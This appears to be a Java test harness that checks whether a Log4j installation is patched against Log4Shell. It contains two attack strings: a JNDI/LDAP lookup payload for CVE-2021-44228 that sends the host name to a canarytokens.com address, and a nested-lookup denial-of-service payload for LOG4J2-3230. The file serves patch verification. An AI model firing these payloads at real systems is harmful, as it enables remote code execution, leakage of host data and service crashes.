package de.silpion.log4shell.hotfix.side.effect;

import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.Core;
import org.apache.logging.log4j.core.config.DefaultConfiguration;

import java.util.LinkedHashMap;
import java.util.Map;

public class Main implements Runnable {
    private final static Map<String, String> GADGETS = new LinkedHashMap<>();
    static {
        GADGETS.put(
            "CVE-2021-44228",
            "${jndi:ldap://x${hostName}.L4J.cyvu6gfqc6sd34ii51nht76in.canarytokens.com/a}");
        GADGETS.put(
            "LOG4J2-3230",
            "${${::-${::-$${::-j}}}}");

        System.setProperty("com.sun.jndi.ldap.connect.timeout", "1000");
        System.setProperty("com.sun.jndi.ldap.read.timeout", "1000");
        System.setProperty(DefaultConfiguration.DEFAULT_LEVEL, Level.INFO.toString());
    }
    private final static Logger LOG = LogManager.getLogger(Main.class);

    private final String[] args;
    private int arg = 0;

    public Main(
        final String[] args
    ) {
        this.args = args;

        version();
    }

    @Override
    public void run() {
        GADGETS.forEach(this::trigger);
    }

    private void trigger(
        final String description,
        final String gadget
    ) {
        final long ts = System.currentTimeMillis();
        LOG.info("Triggering {}", description);
        LOG.info("Trigger: " + (args.length > arg ? args[arg] : gadget));
        LOG.info("That took {}ms", System.currentTimeMillis() - ts);
        arg++;
    }

    private void version() {
        final Class core = Core.class;
        final Package p = core.getPackage();

        boolean patched = false;
        try {
            core.getClassLoader().loadClass(
                p.getName() + ".lookup.JndiLookup"
            );
        }
        catch (ClassNotFoundException e) {
            patched = true;
        }

        LOG.info("Using {} {} (patched: {})",
            p.getImplementationTitle(),
            p.getImplementationVersion(),
            patched
        );

    }

    public static void main(
        final String[] args
    ) throws Exception {
        new Main(args).run();
    }
}